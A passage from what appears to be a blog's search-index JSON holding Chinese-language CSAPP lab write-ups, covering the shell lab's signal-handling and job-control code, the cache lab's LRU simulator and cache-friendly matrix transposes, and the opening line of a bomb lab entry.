return 0x7F800000; else if(x&lt;-149) //float能表达的最小正数是0x00000001(非规格化数) return 0; //2^x的浮点表示为非规格化数 if(x&lt;-126)&#123; x=~(x+126)+1; ans=0x00800000&gt;&gt;x; return ans; &#125; else&#123; //2^x的浮点表示为规格化数 ans=ans+(((x+127)&amp;0x000000FF)&lt;&lt;23); return ans;s &#125;&#125;","categories":[{"name":"csapp","slug":"csapp","permalink":"http://yoursite.com/categories/csapp/"}],"tags":[]},{"title":"csapp-shellLab","slug":"csapp-shellLab","date":"2020-08-29T16:03:34.000Z","updated":"2020-09-04T08:50:35.887Z","comments":true,"path":"2020/08/30/csapp-shellLab/","link":"","permalink":"http://yoursite.com/2020/08/30/csapp-shellLab/","excerpt":"","text":"CSAPP-shell lab本次实验的内容是完成一个简易的shell程序。 在开始实验之前请大家仔细阅读官网的write up，理解程序的要求以及作者给出的hint。 write up：http://csapp.cs.cmu.edu/3e/shlab.pdf 这一次实验的内容和书上第八章的内容联系非常紧密，程序的一部分实现和corner case的书中也有介绍，请在认真阅读第八章（特别是进程控制和信号这两部分） 这一次的shell lab，write up只给出了对程序的大概要求，而具体的一些要求则需要通过我们观察trace文件得到。所以可以从trace01开始，边读trace边改进自己的程序。 官网的压缩包中还包含了tshref可执行文件，类似于cache lab中的csim-ref文件一样，对于每一个trace，tshref提供正确的运行结果。我们的目标就是使得自己编写的tsh文件能够得到和tshref相同的结果。 我们只需要填补tsh.c中空缺的7个函数： eval ：主循环，解析输入的命令行 builtin_cmd：辨别并执行内置命令（quit，fg，bg，jobs） do_bgfg：执行bg和fg内置命令 waitfg：显式等待前台进程执行结束 sigchld_handler：捕获SIGCHLD信号 sigint_handler：捕获SIGINT信号 sigtstp_hander：捕获SIGTSTP信号 eval首先填写eval函数，它是我们程序的一个核心，但是关于eval的实现，可以参考书上8.4节给出的样例，但是注意，书上的程序没有考虑关于信号的问题，但是我们不能忽略信号。 根据8.5信号中提到的父子进程竞争，可能导致在父进程addjob之前，子进程就结束，触发对deletejob的调用。为了解决竞争，需要在fork子进程之前，阻塞SIGCHLD信号，直到父进程addjob之后再解除SIGCHLD信号的阻塞。 另一方面，在write up中提到，为了确保SIGINT和SIGTSTP只作用于前台进程，需要在fork之后，修改子进程的进程组号，调用setpgid(0,0)，使得子进程的进程组号等于其进程号，这样就能保证只会有一个进程处于前台进程组。 (默认情况下，子进程会继承父进程的进程组号，所以我们才需要手动修改子进程的进程组号) 下面给出我的eval代码： 1234567891011121314151617181920212223242526272829303132333435363738void eval(char *cmdline) &#123; char* argv[MAXARGS]; int bg_fg; pid_t pid; sigset_t mask_all,mask_one,prev_one; sigfillset(&amp;mask_all); sigemptyset(&amp;mask_one); sigaddset(&amp;mask_one,SIGCHLD); bg_fg=parseline(cmdline,argv); //分割读入的命令行 if(argv[0]==NULL) return; if(!builtin_cmd(argv))&#123; //识别并处理内置命令 sigprocmask(SIG_BLOCK,&amp;mask_one,&amp;prev_one); //阻塞SIG_CHLD，防止竞争 if((pid=fork())==0)&#123; setpgid(0,0); sigprocmask(SIG_SETMASK,&amp;prev_one,NULL); //子进程继承父进程的阻塞集合，需要解除阻塞 if(execve(argv[0],argv,environ)&lt;0)&#123; //execve会将子进程的信号处理函数置为默认 //无需手动将SIGINT和SIGTSTP的处理程序改为默认行为 printf(&quot;%s: Command not found.\\n&quot;,argv[0]); &#125; exit(0); &#125; sigprocmask(SIG_BLOCK,&amp;mask_all,NULL); addjob(jobs,pid,bg_fg+1,cmdline); //添加作业 sigprocmask(SIG_SETMASK,&amp;prev_one,NULL); //解除阻塞 if(bg_fg==0)&#123; waitfg(pid); //等待前台进程结束 &#125; else&#123; printf(&quot;[%d] (%d) %s&quot;,pid2jid(pid),pid,cmdline); &#125; &#125; return;&#125; builtin_command这个函数需要判断输入的命令行中是否包含内置命令，如果包含内置命令则应该在主进程中马上执行，如果不包含内置命令则返回。 具体实现较为简单，不做过多说明。 下面给出我的builtin_cmd代码： 12345678910111213141516int builtin_cmd(char **argv) &#123; if(!strcmp(argv[0],&quot;quit&quot;)) exit(0); if(!strcmp(argv[0],&quot;jobs&quot;))&#123; listjobs(jobs); return 1; &#125; if(!strcmp(argv[0],&quot;bg&quot;) || !strcmp(argv[0],&quot;fg&quot;))&#123; do_bgfg(argv); return 1; &#125; return 0; /* not a builtin command */&#125; waitfg之后是waitfg函数，主进程通过调用waitfg函数来显式的等待某个子进程（前台进程）执行结束。 这里的实现书上有过相关的讨论，最终决定使用sigsuspend来实现。 下面给出我的waifg代码： 12345678910volatile sig_atomic_t waitPidMark=0; //全局变量，用于检测子进程是否结束void waitfg(pid_t pid)&#123; sigset_t wait; sigemptyset(&amp;wait); waitPidMark=pid; while(waitPidMark) sigsuspend(&amp;wait); return;&#125; do_bgfg对于内置命令bg和fg，单独使用一个do_bgfg来实现它们。简单来说不管是bg还是fg命令，主要的操作就是向对应的进程组发送SIGCONT命令，然后改变作业的状态。但是根据trace14的信息，我们还需要对命令行中bg，fg的参数做一定的约束，对于不满足约束的参数输出提示信息。 下面给出我的do_bgfg代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162int checkDigit(char* s)&#123; //检测输入的参数是否满足，全为数字，或是%数字的形式 //如果参数满足则返回1，如果参数不正确则返回0 int len=strlen(s); int i; if(s[0]==&#x27;%&#x27; || (s[0]&gt;=&#x27;0&#x27; &amp;&amp; s[0]&lt;=&#x27;9&#x27;)); else return 0; for(i=1;i&lt;len;i++)&#123; if(s[i]&lt;&#x27;0&#x27; || s[i]&gt;&#x27;9&#x27;) return 0; &#125; return 1;&#125; struct job_t* str2job(char* s)&#123; //将fg，bg的参数转换为对应的jid或pid int jid; pid_t pid; struct job_t *jPtr; if(s[0]==&#x27;%&#x27;)&#123; jid=atoi(&amp;s[1]); jPtr=getjobjid(jobs,jid); if(jPtr==NULL)&#123; //jid不存在 printf(&quot;%s: No such job\\n&quot;,s); &#125; &#125;else&#123; pid=atoi(s); jPtr=getjobpid(jobs,pid); if(jPtr==NULL)&#123; //pid不存在 printf(&quot;(%s): No such process\\n&quot;,s); &#125; &#125; return jPtr;&#125;void do_bgfg(char **argv) &#123; if(argv[1]==NULL)&#123; //没有输入jid printf(&quot;%s command requires PID or %%jobid argument\\n&quot;,argv[0]); return; &#125; if(!checkDigit(argv[1]))&#123; //输入的jid中含有非数字元素 printf(&quot;%s: argument must be a PID or %%jobid\\n&quot;,argv[0]); return; &#125; struct job_t* jPtr=str2job(argv[1]); if(jPtr==NULL) return; if(!strcmp(argv[0],&quot;bg&quot;))&#123; if(kill(-jPtr-&gt;pid,SIGCONT)&lt;0) //发送给整个进程组，而不是单个进程 unix_error(&quot;kill bg error:&quot;); jPtr-&gt;state=BG; //修改作业状态 printf(&quot;[%d] (%d) %s&quot;,jPtr-&gt;jid,jPtr-&gt;pid,jPtr-&gt;cmdline); &#125; else&#123; if(kill(-jPtr-&gt;pid,SIGCONT)&lt;0) //发送给整个进程组，而不是单个进程 unix_error(&quot;kill fg error:&quot;); jPtr-&gt;state=FG; //修改作业状态 waitfg(jPtr-&gt;pid); //等待这个前台进程终止 &#125; return;&#125; sigchld_handler对SIGCHLD的信号处理也是本次实验的主要内容，同样可以参照书本的样例代码，并在此之上做进一步的改进。 首先是waitpid，一定要加上WNOHANG和WUNTRACED这两个参数，WNOHANG可以告诉主进程无需挂起等待子进程结束，而WUNTRACED则会在子进程进入暂停状态时，返回信息。 上面的waitfg中使用了一个标志前台进程的全局变量waitPidMark来实现对前台进程的显式等待。在SIGCHLD的处理程序中，每当一个子进程结束时，需要检验这个进程是不是前台进程，如果是的话需要修改waitPidMark，这样waitfg才能知道前台进程已经结束，它应该返回了。 另一方面，对于waitpid的返回值，也需要判断这个进程是结束了还是暂停了，并且针对进程状态输出对应的提示信息。 下面是我的sigchld_handler代码： 123456789101112131415161718192021222324252627282930313233343536void sigchld_handler(int sig) &#123; int olderrno=errno; int status; int jid; sigset_t mask_all,prev_all; pid_t tmpCheck; sigfillset(&amp;mask_all); //WNOHANG | WUNTRACED必须加上，否则就会将进程挂起等待子进程终止 //在trace05中会使得后续进程等待很长时间 while((tmpCheck=waitpid(-1,&amp;status,WNOHANG | WUNTRACED))&gt;0)&#123; sigprocmask(SIG_BLOCK,&amp;mask_all,&amp;prev_all); if(tmpCheck==fgpid(jobs)) waitPidMark=0; //确定终止进程是否是前台进程 if(WIFSTOPPED(status))&#123; //返回的子进程停止，则在作业集中修改它的状态 jid=pid2jid(tmpCheck); printf(&quot;Job [%d] (%d) stopped by signal %d\\n&quot;,jid,tmpCheck,WSTOPSIG(status)); struct job_t* jPtr=getjobpid(jobs,tmpCheck); jPtr-&gt;state=ST; &#125;else&#123; //如果返回子进程终止，则从作业集中删除它 //注意不能只在WIFSIGNALED的条件语句中调用deletejob //只要子进程结束了，都应该调用deletejob if(WIFSIGNALED(status))&#123; jid=pid2jid(tmpCheck); printf(&quot;Job [%d] (%d) terminated by signal %d\\n&quot;,jid,tmpCheck,WTERMSIG(status)); //打印出进程终止原因 deletejob(jobs,tmpCheck); //删除作业 &#125; deletejob(jobs,tmpCheck); //删除作业 &#125; fflush(stdout); sigprocmask(SIG_SETMASK,&amp;prev_all,NULL); &#125; errno=olderrno; return;&#125; sigint_handler和sigtstp_handler最后是对SIGINT和SIGTSTP的信号处理函数，这两个信号处理函数的内容很简单也非常相似，所以就放在一起说明了。 这一部分唯一需要注意的是使用kill发送信号时，参数需要使用-pid，而不是pid。因为SIGINT和SIGTSTP需要被发送给整个前台进程组，都不是单个进程。测试程序会检测这方面的内容。 下面是我的sigint_handler和sigtstp_handler代码： 1234567891011121314151617181920212223242526272829void sigint_handler(int sig) &#123; int olderrno=errno; sigset_t mask_all,prev_all; sigfillset(&amp;mask_all); sigprocmask(SIG_BLOCK,&amp;mask_all,&amp;prev_all); pid_t fgp=fgpid(jobs); if(kill(-fgp,SIGINT)&lt;0)&#123; //发送给前台进程组 unix_error(&quot;kill sigint error&quot;); &#125; sigprocmask(SIG_SETMASK,&amp;prev_all,NULL); errno=olderrno; return;&#125;void sigtstp_handler(int sig) &#123; int olderrno=errno; sigset_t mask_all,prev_all; sigfillset(&amp;mask_all); sigprocmask(SIG_BLOCK,&amp;mask_all,&amp;prev_all); pid_t fgp=fgpid(jobs); if(kill(-fgp,SIGTSTP)&lt;0)&#123; //发送给前台进程组 unix_error(&quot;kill sigtstp error&quot;); &#125; sigprocmask(SIG_SETMASK,&amp;prev_all,NULL); errno=olderrno; return;&#125; 总结至此，shell lab就做完了。本次实验与书本上的内容结合的更加紧密，对于一些机制的实现，书本上都有非常详细的讨论和解释。通过这次实验，让我更加深刻理解了信号的作用，以及一个shell程序的大致执行流程。","categories":[{"name":"csapp","slug":"csapp","permalink":"http://yoursite.com/categories/csapp/"}],"tags":[]},{"title":"csapp-cacheLab","slug":"csapp-cacheLab","date":"2020-08-29T16:02:59.000Z","updated":"2020-09-04T08:50:07.451Z","comments":true,"path":"2020/08/30/csapp-cacheLab/","link":"","permalink":"http://yoursite.com/2020/08/30/csapp-cacheLab/","excerpt":"","text":"csapp-cacheLab在开始实验时请认真阅读实验的指导书，其中关于实验的注意点和要求都写的非常明确，这些内容在本篇文章中不会提及。 http://csapp.cs.cmu.edu/3e/cachelab.pdf PartA第一部分要求我们编写一个cache的模拟器，通过在运行程序时提供参数确定cache的参数(E–&gt;行数，s–&gt;索引位长，b–&gt;存储块的位长)，然后顺序读取测试文件中提供的64位内存地址序列，最后输出在这一过程中的hit,miss,evicts 压缩包中提供了一个二进制文件csim-ref，这个文件就是我们的参照，我们程序的运行结果需要和它完全相同。 首先是存储cache参数的数据结构 123456789struct _cacheInfo_&#123; int S; //组数 int E; //行数 int B; //块大小（字节） int m; //物理地址位数，64 int s_bit; //组索引位数 int b_bit; //块偏移位数 int t_bit; //标记位数&#125;cacheInfo; 然后我们需要处理程序的命令行参数，使用getopt函数（writeup里有提示） 123456789101112131415161718192021222324252627while((ch=getopt(argc,argv,&quot;hvs:E:b:t:&quot;))!=-1)&#123; switch(ch)&#123; case &#x27;h&#x27;: print_help_info(); //打印对该程序的使用指南 return 0; case &#x27;v&#x27;: verbose_flag=1; //修改标志位 break; case &#x27;s&#x27;: cacheInfo.s_bit=atoi(optarg); cacheInfo.S=1&lt;&lt;cacheInfo.s_bit; break; case &#x27;E&#x27;: cacheInfo.E=atoi(optarg); break; case &#x27;b&#x27;: cacheInfo.b_bit=atoi(optarg); cacheInfo.B=1&lt;&lt;cacheInfo.b_bit; break; case &#x27;t&#x27;: fp=fopen(optarg,&quot;r&quot;); break; default: printf(&quot;Unknown option: %c\\n&quot;,(char)optopt); break; &#125;&#125; 然后需要定义cache的存储内容，为了逻辑清晰可以再定义一个结构来整合这些信息，但是这只是一个小程序，我就直接使用三个二维数组将cache的信息分开存放了。 123456789101112131415 cache=(long **)malloc(sizeof(long*)*cacheInfo.S); //分配地址空间模拟cache, [索引组][行数]---&gt;标志位 mark=(bool **)malloc(sizeof(bool*)*cacheInfo.S); //对应每一组内每一行的有效位,[索引组][行数]---&gt;有效位 time_tag=(int **)malloc(sizeof(int*)*cacheInfo.S); //时间标记,[索引组][行数]---&gt;时间戳(用于LRU算法的替换依据) for(int i=0;i&lt;cacheInfo.S;i++)&#123; //初始化 cache[i]=(long*)malloc(sizeof(long)*cacheInfo.E); mark[i]=(bool*)malloc(sizeof(bool)*cacheInfo.E); time_tag[i]=(int*)malloc(sizeof(int)*cacheInfo.E); &#125; for(int i=0;i&lt;cacheInfo.S;i++)&#123; for(int j=0;j&lt;cacheInfo.E;j++) mark[i][j]=false; &#125; 然后就是处理实际的地址访问请求的函数，这里我写一些伪代码说明流程，具体实现还是大家自己思考。 12345678910111213141516171819202122while(读入一个memory traces)&#123; 判断它的类型，如果是I(I类指令最前面没有空格，其他指令前面有空格)则不用处理，continue; 取出memory traces的内存地址，将其转换为long 将内存地址划分为组索引saddr和有效位taddr，块内偏移量可以忽略(writeup中有提示) for(遍历cache数组和mark数组)&#123; if(mark[saddr][row]=true,且cache[saddr][row]=taddr) //cache中保存有对应的内存单元 then hit++; 更新time[saddr][row]的时间戳; &#125; if(cache中没有找到对应内存单元)&#123; miss++; LRU_replacement(); &#125; if(memory trace type==M)&#123; hit++; //M必定发生2次hit或1次hit+1次miss,将缺的一次hit补上 &#125;&#125; 最后需要完善cache的替换策略，本次实验中只需要实现较为简单的LRU策略，LRU策略会将一个最长时间未被使用的内存块换出cache，为了支持这一点，我们使用一个time_targ二维数组来记录每一个索引组中每一行的时间戳，使用全局的整型变量time，每一次对内存的访问都会使得time变量递增并且更新到time_targ[saddr] [row]。在需要替换内存块时，就遍历对应索引组的所有行，找到time[saddr] [row]最小的那一个替换出cache。 123456789101112131415161718192021222324void LRU_replacement(long saddr,long taddr,char* cacheState)&#123; for(int i=0;i&lt;cacheInfo.E;i++)&#123; //首先检查有没有空闲的块可以存放读入的内存单元 if(!mark[saddr][i])&#123; cache[saddr][i]=taddr; mark[saddr][i]=true; time_tag[saddr][i]=time++; //时间标记，在驱逐的时候会用到它 return; &#125; &#125; int minTime=0x7fffffff; int minIndex=0; for(int i=0;i&lt;cacheInfo.E;i++)&#123; //cache已满，需要驱逐 int stamp=time_tag[saddr][i]; if(stamp&lt;minTime)&#123; //寻找时间戳最小的那一行换出 minTime=stamp; minIndex=i; &#125; &#125; printf (&quot;evicts taddr=%ld saddr=%ld\\n&quot;,cache[saddr][minIndex],saddr); cache[saddr][minIndex]=taddr; time_tag[saddr][minIndex]=time++; evicts++; strcat(cacheState,&quot; evicts&quot;);&#125; 至此，partA的cache模拟器就完成了。 Part B这一部分只要是编写矩阵转置函数，并且要求在转置过程中发生尽可能少的miss 用于测试的矩阵有三种规格32x32,64x64,61x67，我们可以针对不同规模的矩阵使用专门的转置模式（不这么做也过不了测试）。 下面是对性能评估和分数的情况。 • 32 × 32: 8 points if m &lt; 300, 0 points if m &gt; 600• 64 × 64: 8 points if m &lt; 1, 300, 0 points if m &gt; 2, 000• 61 × 67: 10 points if m &lt; 2, 000, 0 points if m &gt; 3, 000 32x32首先可以看到普通的按行转置的方法在的数据为: hits:870 misses: 1183 evictions: 1151（32x32） 给定的cache参数为s=5,E=1,b=5，即有32个组，每个组一行，每一行存储32个字节的块 要减少miss的情况，主要要解决冲突不命中的情况。 首先，根据每一个行存储32字节的块，可以推出每一个块一次可以读入8个int，那么我们就可以直接使用8个临时变量将块内的8个int值存在寄存器中，防止后续出现冲突导致它们被换出。根据这个想法，我们改进一下示例代码。 1234567891011int i,j;int tmp1,tmp2,tmp3,tmp4;int tmp5,tmp6,tmp7,tmp8; for(i=0;i&lt;N;i++)&#123; for(j=0;j&lt;M;j+=8)&#123; tmp1=A[i][j]; tmp2=A[i][j+1]; tmp3=A[i][j+2]; tmp4=A[i][j+3]; tmp5=A[i][j+4]; tmp6=A[i][j+5]; tmp7=A[i][j+6]; tmp8=A[i][j+7]; B[j][i]=tmp1; B[j+1][i]=tmp2; B[j+2][i]=tmp3; B[j+3][i]=tmp4; B[j+4][i]=tmp5; B[j+5][i]=tmp6; B[j+6][i]=tmp7; B[j+7][i]=tmp8; &#125;&#125; 试着测试一下这个改进代码的性能。 1func 0 (Transpose submission): hits:898, misses:1155, evictions:1123 很遗憾，这种运行模式好像没有提高性能。 我在这里卡了一段时间，最后得到的结论是，需要进一步的了解A，B的内存地址与cache的映射，这样才能做更加细致的分析和优化。 查看测试生成的数据trace.f0。在多次运行数据后，我发现多次测试生成的数组A的地址(0x0030a080)和数组B的地址(0x0034a080)都是固定的，那么我们就能够分析它们分别对应于cache中的哪个组，已经对应的标记位。 根据addr(A)=0x0030a080，addr(B)=0x0034a080，可以发现它们都映射到组4，但是都拥有不同的标记位。 具体分析我们上面的改进代码可以发现，每一轮中的8个对数组A的加载操作只会产生至多1次miss，但是每一次对于数组B的8次存储操作都会引发miss和evict。 下面给出 i=0,j=0 和 i=0，j=1这两个情况下，对数组B的存储操作的输出信息 12345678910111213141516171819 //i=0，j=0,冷启动,---&gt;右侧表示该内存地址对于的cache组 S 0034a080,4 miss evicts --&gt; saddr=4 S 0034a100,4 miss --&gt; saddr=8 S 0034a180,4 miss --&gt; saddr=12 S 0034a200,4 miss --&gt; saddr=16 S 0034a280,4 miss --&gt; saddr=20 S 0034a300,4 miss --&gt; saddr=24 S 0034a380,4 miss --&gt; saddr=28 S 0034a400,4 miss --&gt; saddr=0-------------------------------------------------------------------------------------------------- //i=0,j=1,--&gt;右侧表示被“驱逐出”cache的内存块的信息() S 0034a480,4 miss evicts --&gt; evicts taddr=3368 saddr=4 S 0034a500,4 miss evicts evicts taddr=3368 saddr=8 S 0034a580,4 miss evicts evicts taddr=3368 saddr=12 S 0034a600,4 miss evicts evicts taddr=3368 saddr=16 S 0034a680,4 miss evicts evicts taddr=3368 saddr=20 S 0034a700,4 miss evicts evicts taddr=3368 saddr=24 S 0034a780,4 miss evicts evicts taddr=3368 saddr=28 S 0034a800,4 miss evicts evicts taddr=3369 saddr=0 可以看到第一轮加载入cache的B的内存块，在第二轮循环中全部被替换出cache，根据输出数据，后续的每一轮循环都会发生这种情况。 那么如何在保证对A维持这样高效的读取的同时，减少对B的冲突不命中呢？ 这样就需要修改读取顺序，举例说我们第一组读入的是 B[ 0 ] [ 0 ]，B[ 1 ] [ 0 ]，B[ 2 ] [ 0 ]，B[ 3 ] [ 0 ]，B[ 4 ] [ 0 ]，B[ 5 ] [ 0 ]，B[ 6 ] [ 0 ]，B[ 7 ] [ 0 ] 那么假设我们第二轮读入的不是 B[ 8 ] [ 0 ]，B[ 9 ] [ 0 ]…. 而是B[ 0 ] [ 1 ]，B[ 1 ] [ 1 ]，B[ 2 ] [ 1 ]，B[ 3 ] [ 1 ]，B[ 4 ] [ 1 ]，B[ 5 ] [ 1 ]，B[ 6 ] [ 1 ]，B[ 7 ] [ 1 ] 这样第二轮对于B的读取就能够全部命中（准确的说不一定是全部命中，有时会与A发生一次冲突)，并且对于A的高效读取策略也能够兼容。 根据以上的思路修改代码循环的顺序，得到以下代码。 123456789101112 int i,j; int tmp1,tmp2,tmp3,tmp4; int tmp5,tmp6,tmp7,tmp8; for(j=0;j&lt;M;j+=8)&#123; for(i=0;i&lt;N;i++)&#123; tmp1=A[i][j]; tmp2=A[i][j+1]; tmp3=A[i][j+2]; tmp4=A[i][j+3]; tmp5=A[i][j+4]; tmp6=A[i][j+5]; tmp7=A[i][j+6]; tmp8=A[i][j+7]; B[j][i]=tmp1; B[j+1][i]=tmp2; B[j+2][i]=tmp3; B[j+3][i]=tmp4; B[j+4][i]=tmp5; B[j+5][i]=tmp6; B[j+6][i]=tmp7; B[j+7][i]=tmp8; &#125; &#125;//外循环按列，内循环按行，每一次在A中横着连续读8个int 测试后得到性能如下，miss&lt;300，成功通过第一个测试点。 1func 0 (Transpose submission): hits:1766, misses:287, evictions:255 64x64先使用32x32的代码测试一下，最后得到miss&gt;4000，可以知道，同样的代码在不同的矩阵下是无法通用的，根据讲义上的提示，我们可以根据每个测试点量身定做它独有的访问模式来提高缓存命中率。 重新审视一下这个矩阵，会发现由于列数从32扩展至64，使得每一行的元素实际上需要8个缓存组才能装下，这也说明，我们每次跨越一行，实际上跨越了8个缓存组，由于总共只有32个缓存组，所以在连续转换4行后，再转换到第五行时，会发生冲突不命中，将第一行的缓存数据驱逐出去，这就是我们沿用32x32的策略却效率很差的原因。 通过上述分析后，得出当一次只转置连续4个元素时，就不会发生冲突，这样就得到以下代码 12345678int i,j;int tmp1,tmp2,tmp3,tmp4;for(j=0;j&lt;M;j+=4)&#123; for(i=0;i&lt;N;i++)&#123; tmp1=A[i][j]; tmp2=A[i][j+1]; tmp3=A[i][j+2]; tmp4=A[i][j+3]; B[j][i]=tmp1; B[j+1][i]=tmp2; B[j+2][i]=tmp3; B[j+3][i]=tmp4; &#125;&#125; 得到测试结果如下 1func 0 (Transpose submission): hits:6546, misses:1651, evictions:1619 可以看到miss的数量大幅下降，但是还未低于1300。 进一步分析，上述方法中，对B的每一个块只发生一次miss，但是对A的每一个块则发生两次miss(前4个元素一次，后四个一次)，那我们也许可以试着让A的每一个块只发生一次miss，即每一次都直接将块中的8个元素读出，前4个元素直接转换，但是后4个不能马上转换（如果立即转换就会发生冲突，参考上面关于32x32模式的低效原因），这时我们可以把它放在B的其他位置，因为我们有32个缓存组，但是实际上同一时间内的使用率却非常低，所以可以将它存放在不会发生冲突的缓存组。 我们计算一下对于一个8x8的块，这种改进的方法是否会优化miss数。 首先考虑一次只读4个元素转置的方法: misses=8(读入B的8个行)+16(每次读入A的半行)=24 再考虑改进后的方法: missed=8(读入B的4个行)+8(每次读入A的一个行)+4(读入用于暂存A中后4列的4个临时块)=20 可以发现效率有小幅提高，尝试写出代码并查看结果是否如我们推测的那样。 1234567891011121314151617181920212223242526int i,j,k;int tmp1,tmp2,tmp3,tmp4;int tmp5,tmp6,tmp7,tmp8;for(k=0;k&lt;N-8;k+=8)&#123; for(j=0;j&lt;M;j+=8)&#123; for(i=k;i&lt;k+8;i++)&#123; tmp1=A[i][j]; tmp2=A[i][j+1]; tmp3=A[i][j+2]; tmp4=A[i][j+3]; tmp5=A[i][j+4]; tmp6=A[i][j+5]; tmp7=A[i][j+6]; tmp8=A[i][j+7]; B[j][i]=tmp1; B[j+1][i]=tmp2; B[j+2][i]=tmp3; B[j+3][i]=tmp4; B[j][i+8]=tmp5; B[j+1][i+8]=tmp6; B[j+2][i+8]=tmp7; B[j+3][i+8]=tmp8; //暂存在B中的空闲位 &#125; for(i=k;i&lt;k+8;i++)&#123; //将暂存在B中空闲位置的数据转置到正确的位置 tmp1=B[j][i+8]; tmp2=B[j+1][i+8]; tmp3=B[j+2][i+8]; tmp4=B[j+3][i+8]; B[j+4][i]=tmp1; B[j+5][i]=tmp2; B[j+6][i]=tmp3; B[j+7][i]=tmp4; &#125; &#125;&#125;for(j=0;j&lt;M;j+=4)&#123; //转置到最后一个块时，B的其他位置已经全部转置完毕，没有额外的空间暂存 //只能退化为4x4的方式(一次只读4个元素) for(i=N-8;i&lt;N;i++)&#123; tmp1=A[i][j]; tmp2=A[i][j+1]; tmp3=A[i][j+2]; tmp4=A[i][j+3]; B[j][i]=tmp1; B[j+1][i]=tmp2; B[j+2][i]=tmp3; B[j+3][i]=tmp4; &#125;&#125; 得到测试结果如下。 1func 0 (Transpose submission): hits:10354, misses:1427, evictions:1395 可以看到，miss数大约减少了1/6，和我们分析的大致相同（miss数的减少有偏差是因为我们上述是对非对角线的块分析，对于对角线上的块而言，A，B在缓存中对应的组相同，A和B之间会发生冲突不命中，所以这些块转置时产生的miss数和我们分析的不一样）。 后续由于我实在想不到更好的优化方法了，只好上网查看其他大佬的解法。这里贴出一个大佬的博客，我觉得他写的十分清晰，同时也有相应的图示。 https://blog.csdn.net/xbb224007/article/details/81103995 对于这种方法的解析可以直接看上面这个博客，相比于我提供的优化方法而言，这个方法更进一步，它不需要读入额外的4个暂存块，而是使用巧妙的方法在块的内部进行暂存和转置，我这里只贴出自己的代码。 12345678910111213141516171819202122for(k=0;k&lt;N;k+=8)&#123; for(j=0;j&lt;M;j+=8)&#123; for(i=k;i&lt;k+4;i++)&#123; //前四行,前四列正常转置，后四列翻转后暂存在B的非对应位中 tmp1=A[i][j]; tmp2=A[i][j+1]; tmp3=A[i][j+2]; tmp4=A[i][j+3]; tmp5=A[i][j+4]; tmp6=A[i][j+5]; tmp7=A[i][j+6]; tmp8=A[i][j+7]; B[j][i]=tmp1; B[j+1][i]=tmp2; B[j+2][i]=tmp3; B[j+3][i]=tmp4; B[j][i+4]=tmp5; B[j+1][i+4]=tmp6; B[j+2][i+4]=tmp7; B[j+3][i+4]=tmp8; &#125; for(d=j;d&lt;j+4;d++)&#123; //后四行前四列(corner case) tmp1=A[k+4][d]; tmp2=A[k+5][d]; tmp3=A[k+6][d]; tmp4=A[k+7][d]; tmp5=B[d][k+4]; tmp6=B[d][k+5]; tmp7=B[d][k+6]; tmp8=B[d][k+7]; B[d][k+4]=tmp1; B[d][k+5]=tmp2; B[d][k+6]=tmp3; B[d][k+7]=tmp4; //这两行的顺序很重要，不能颠倒，否则会导致大量的冲突不命中 B[4+d][k]=tmp5; B[4+d][k+1]=tmp6; B[4+d][k+2]=tmp7; B[4+d][k+3]=tmp8; &#125; for(i=k+4;i&lt;k+8;i++)&#123; //后四行后四列，按4x4块的模式转置 tmp1=A[i][j+4]; tmp2=A[i][j+5]; tmp3=A[i][j+6]; tmp4=A[i][j+7]; B[j+4][i]=tmp1; B[j+5][i]=tmp2; B[j+6][i]=tmp3; B[j+7][i]=tmp4; &#125; &#125;&#125; 最终运行效率如下。 1func 0 (Transpose submission): hits:9066, misses:1179, evictions:1147 61x67可以发现，当列数由64变为67时，数组中不同元素在cache中对应的组也会发生变化。 下面取前8行第一个元素，分析它们在不同矩阵中所属缓存组的变化。 123456789&#x2F;&#x2F;在64x64矩阵中 &#x2F;&#x2F;在61x67矩阵中A[0][0]---&gt;saddr&#x3D;4 A[0][0]-----&gt;saddr&#x3D;4A[1][0]---&gt;saddr&#x3D;12 A[1][0]-----&gt;saddr&#x3D;11A[2][0]---&gt;saddr&#x3D;20 A[2][0]-----&gt;saddr&#x3D;19A[3][0]---&gt;saddr&#x3D;28 A[3][0]-----&gt;saddr&#x3D;26A[4][0]---&gt;saddr&#x3D;4 A[4][0]-----&gt;saddr&#x3D;2A[5][0]---&gt;saddr&#x3D;12 A[5][0]-----&gt;saddr&#x3D;10A[6][0]---&gt;saddr&#x3D;20 A[6][0]-----&gt;saddr&#x3D;17A[7][0]---&gt;saddr&#x3D;28 A[7][0]-----&gt;saddr&#x3D;25 所属缓存组的变化会直接影响到冲突不命中的情况，当元素的所属组不同时，就能够更加充分的利用cache的空间，我们就能够使用更大的分块处理数据，并且能够得到一个较低的miss数。 通过分析得知，在61x67矩阵中，我们可以像32x32矩阵那样一次处理8x8的分块，并且不会发生大量的冲突不命中（64x64则会发生大量冲突），所以我们可以先试着对其进行8x8的分块，最右侧剩余(61%8=5)的部分单独处理。 1234567891011121314for(j=0;j&lt;M;j+=8)&#123; for(i=0;i&lt;N;i++)&#123; if(j==56)&#123; tmp1=A[i][j]; tmp2=A[i][j+1]; tmp3=A[i][j+2]; tmp4=A[i][j+3]; tmp5=A[i][j+4]; B[j][i]=tmp1; B[j+1][i]=tmp2; B[j+2][i]=tmp3; B[j+3][i]=tmp4; B[j+4][i]=tmp5; &#125; tmp1=A[i][j]; tmp2=A[i][j+1]; tmp3=A[i][j+2]; tmp4=A[i][j+3]; tmp5=A[i][j+4]; tmp6=A[i][j+5]; tmp7=A[i][j+6]; tmp8=A[i][j+7]; B[j][i]=tmp1; B[j+1][i]=tmp2; B[j+2][i]=tmp3; B[j+3][i]=tmp4; B[j+4][i]=tmp5; B[j+5][i]=tmp6; B[j+6][i]=tmp7; B[j+7][i]=tmp8; &#125;&#125; 性能测试结果如下。 1Summary for official submission (func 0): correctness&#x3D;1 misses&#x3D;1852 可以发现，我们只是简单的做了个8x8的分块，就达到了要求，看来这个测试点还是比较水的- - 最终测试结果:","categories":[{"name":"csapp","slug":"csapp","permalink":"http://yoursite.com/categories/csapp/"}],"tags":[]},{"title":"csapp-bomblab","slug":"csapp-bombLab","date":"2020-08-29T16:02:15.000Z","updated":"2020-09-04T08:50:14.318Z","comments":true,"path":"2020/08/30/csapp-bombLab/","link":"","permalink":"http://yoursite.com/2020/08/30/csapp-bombLab/","excerpt":"","text":"CSAPP-BombLabGDB简要指南:http://csapp.cs.cmu.edu/3e/docs/gdbnotes-x86-64.pdf BombLab主要是为了学习如何阅读汇编代码和使用调试工具。 